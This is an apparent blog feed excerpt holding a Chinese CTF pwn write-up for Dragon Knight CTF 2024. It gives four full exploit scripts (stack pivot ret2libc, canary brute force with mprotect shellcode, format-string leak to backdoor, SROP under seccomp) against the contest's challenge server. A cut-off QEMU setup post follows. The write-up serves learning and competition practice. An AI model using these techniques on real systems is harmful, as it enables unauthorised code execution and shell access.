      <description>&lt;p&gt;Dragon Knight CTF 2024 pwn wp&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Dragon Knight CTF 2024 pwn wp</p><span id="more"></span><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>非常经典的栈迁移例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = <span class="string">&#x27;/home/feichai/ctf_file/libc-2.31.so&#x27;</span></span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">31728</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    puts_plt=elf.plt.puts</span><br><span class="line">    puts_got=elf.got.puts</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x0000000000401210</span></span><br><span class="line">    leave_ret = <span class="number">0x00000000004011be</span></span><br><span class="line">    bss = <span class="number">0x404040</span> + <span class="number">0x500</span></span><br><span class="line">    pop_rbp = <span class="number">0x000000000040115d</span></span><br><span class="line">    </span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(bss+<span class="number">0x100</span>)+p64(<span class="number">0x40118F</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;pivoting?&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">    pd+=p64(pop_rbp)+p64(bss+<span class="number">0x500</span>)+p64(<span class="number">0x40118F</span>)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    sa(<span class="string">b&#x27;pivoting?&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    leak_libc = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = leak_libc-libc.symbols[<span class="string">b&#x27;puts&#x27;</span>]</span><br><span class="line">    libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(bin_sh_addr)+p64(libc_system)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(bss+<span class="number">0x500</span>-<span class="number">0x100</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    </span><br><span class="line">    sa(<span class="string">b&#x27;pivoting?&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>爆破canary然后用mprotect提权</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>,<span class="number">30537</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;input:\n&#x27;</span>)</span><br><span class="line">    canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="comment">#sleep(0.1)</span></span><br><span class="line">            s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + canary + p8(i))</span><br><span class="line">            aa = ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;smashing&#x27;</span> <span class="keyword">in</span> aa:</span><br><span class="line">                ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                canary += p8(i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">b&quot;canary: &quot;</span> + canary)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x00000000004018c2</span></span><br><span class="line">    pop_rsi = <span class="number">0x000000000040f23e</span></span><br><span class="line">    pop_rdx = <span class="number">0x00000000004017cf</span></span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + canary + <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    got_plt = <span class="number">0x4c1000</span></span><br><span class="line">    call_mprotect = <span class="number">0x449774</span></span><br><span class="line">    call_read = <span class="number">0x448920</span></span><br><span class="line"></span><br><span class="line">    pd += p64(pop_rdi) + p64(got_plt)</span><br><span class="line">    pd += p64(pop_rsi) + p64(<span class="number">0x1000</span>) </span><br><span class="line">    pd += p64(pop_rdx) + p64(<span class="number">7</span>)</span><br><span class="line">    pd += p64(call_mprotect)</span><br><span class="line">    </span><br><span class="line">    pd += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">    pd += p64(pop_rsi) + p64(got_plt)</span><br><span class="line">    pd += p64(pop_rdx) + p64(<span class="number">0xff</span>)</span><br><span class="line">    pd += p64(call_read) + p64(got_plt)</span><br><span class="line"></span><br><span class="line">    s(pd)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sc = asm(shellcraft.sh())</span><br><span class="line">    s(sc)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="ez-quiz"><a href="#ez-quiz" class="headerlink" title="ez_quiz"></a>ez_quiz</h3><p>解密不太会，用gpt写的，然后就是eval计算，fmt泄露基址，溢出返回backdoor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/ez_quiz&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x1E71)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">30162</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a,drop=<span class="literal">True</span>)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    sla(<span class="string">&quot;Please give me your token:&quot;</span>,<span class="string">&#x27;DRKCTF&#123;P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie&#125;&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;Right!&#x27;</span>)</span><br><span class="line">    ans = <span class="built_in">eval</span>(ru(<span class="string">&#x27;=&#x27;</span>))</span><br><span class="line">    sla(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(ans))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">&#x27;gift:\n&#x27;</span>,<span class="string">&#x27;%13$p%11$p&#x27;</span>) <span class="comment"># 6</span></span><br><span class="line">    leak_pie = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(r(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">    lg(<span class="string">&#x27;leak_pie&#x27;</span>,leak_pie)</span><br><span class="line">    lg(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"></span><br><span class="line">    pie_base = leak_pie - <span class="number">0x2042</span></span><br><span class="line">    backdoor = pie_base + <span class="number">0x1426</span></span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)+p64(canary)+p64(<span class="number">1</span>)+p64(backdoor)</span><br><span class="line">    sl(pd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="srop-seccomp"><a href="#srop-seccomp" class="headerlink" title="srop_seccomp"></a>srop_seccomp</h3><p>题目即考点，基础题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/chall&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">30374</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    bss = <span class="number">0x404060</span></span><br><span class="line">    mov_rax_0xf = <span class="number">0x0000000000401193</span></span><br><span class="line">    syscall = <span class="number">0x000000000040118a</span></span><br><span class="line">    flag_addr = bss+<span class="number">0x400</span></span><br><span class="line">    leave_ret = <span class="number">0x000000000040136c</span></span><br><span class="line">    ret = <span class="number">0x0000000000401016</span></span><br><span class="line"></span><br><span class="line">    sigopen = SigreturnFrame()</span><br><span class="line">    sigopen.rax = <span class="number">2</span></span><br><span class="line">    sigopen.rdi = flag_addr</span><br><span class="line">    sigopen.rsi = <span class="number">0</span></span><br><span class="line">    sigopen.rdx = <span class="number">0</span></span><br><span class="line">    sigopen.rsp = bss+<span class="number">0x108</span></span><br><span class="line">    sigopen.rbp = bss+<span class="number">0x108</span></span><br><span class="line">    sigopen.rip = syscall</span><br><span class="line">    </span><br><span class="line">    sigread = SigreturnFrame()</span><br><span class="line">    sigread.rax = <span class="number">0</span></span><br><span class="line">    sigread.rdi = <span class="number">3</span></span><br><span class="line">    sigread.rsi = bss + <span class="number">0x700</span></span><br><span class="line">    sigread.rdx = <span class="number">0x100</span></span><br><span class="line">    sigread.rsp = bss+<span class="number">0x218</span></span><br><span class="line">    sigread.rbp = bss+<span class="number">0x218</span></span><br><span class="line">    sigread.rip = syscall</span><br><span class="line">    </span><br><span class="line">    sigwrite = SigreturnFrame()</span><br><span class="line">    sigwrite.rax = <span class="number">1</span></span><br><span class="line">    sigwrite.rdi = <span class="number">1</span></span><br><span class="line">    sigwrite.rsi = bss + <span class="number">0x700</span></span><br><span class="line">    sigwrite.rdx = <span class="number">0x100</span></span><br><span class="line">    <span class="comment">#sigwrite.rsp = bss+0x320</span></span><br><span class="line">    <span class="comment">#sigwrite.rbp = bss+0x320</span></span><br><span class="line">    sigwrite.rip = syscall</span><br><span class="line"></span><br><span class="line">    pd = p64(mov_rax_0xf)+p64(syscall)</span><br><span class="line">    pd += <span class="built_in">bytes</span>(sigopen)</span><br><span class="line"></span><br><span class="line">    pd += p64(<span class="number">0x1</span>)+p64(mov_rax_0xf)+p64(syscall)</span><br><span class="line">    pd += <span class="built_in">bytes</span>(sigread)</span><br><span class="line"></span><br><span class="line">    pd += p64(<span class="number">0x1</span>)+p64(mov_rax_0xf)+p64(syscall)</span><br><span class="line">    pd += <span class="built_in">bytes</span>(sigwrite)</span><br><span class="line"></span><br><span class="line">    pd = pd.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&#x27;easyhack&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(bss-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">    sa(<span class="string">b&#x27;SUID?\n&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/write-up/">write up</category>
      
      
      
      <comments>http://example.com/2024/05/26/Dragon-Knight-CTF-2024-pwn-wp/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kernel pwn入门之qemu环境的配置</title>
      <link>http://example.com/2024/05/23/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE/</link>
      <guid>http://example.com/2024/05/23/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8Bqemu%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE/</guid>
      <pubDate>Thu, 23 May 2024 09:33:19 GMT</pubDate>
      
      <description>&lt;p&gt;记录一下自己是如何完成qemu环境配置的，以及在配置环境时遇到的问题及解决方案&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记录一下自己是如何完成qemu环境配置的，以及在配置环境时遇到的问题及解决方案</p><span id="more"></span><h3 id="环境版本说明"><a href="#环境版本说明" class="headerlink" title="环境版本说明"></a>环境版本说明</h3><p>​ubuntu20.04</p><p>​VMware虚拟机</p><h3 id="qemu安装"><a href="#qemu安装" class="headerlink" title="qemu安装"></a>qemu安装</h3><p>参考文章：<a href="https://arcsin2.cloud/2023/03/03/Ubuntu-22-04-%E5%AE%89%E8%A3%85-QEMU-%E6%B5%81%E7%A8%8B/">Ubuntu 22.04 安装 QEMU 流程 - arcsin2 的个人博客</a></p><h4 id="拉取并解压"><a href="#拉取并解压" class="headerlink" title="拉取并解压"></a>拉取并解压</h4><p>我用 wget 拉取时比较慢，直接复制链接下载完再复制到虚拟机里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-7.2.0.tar.xz</span><br><span class="line">tar -zxvf qemu-7.2.0.tar.xz</span><br><span class="line">cd qemu-7.2.0/</span><br></pre></td></tr></table></figure><h4 id="安装依赖"><a href="#安装依赖" 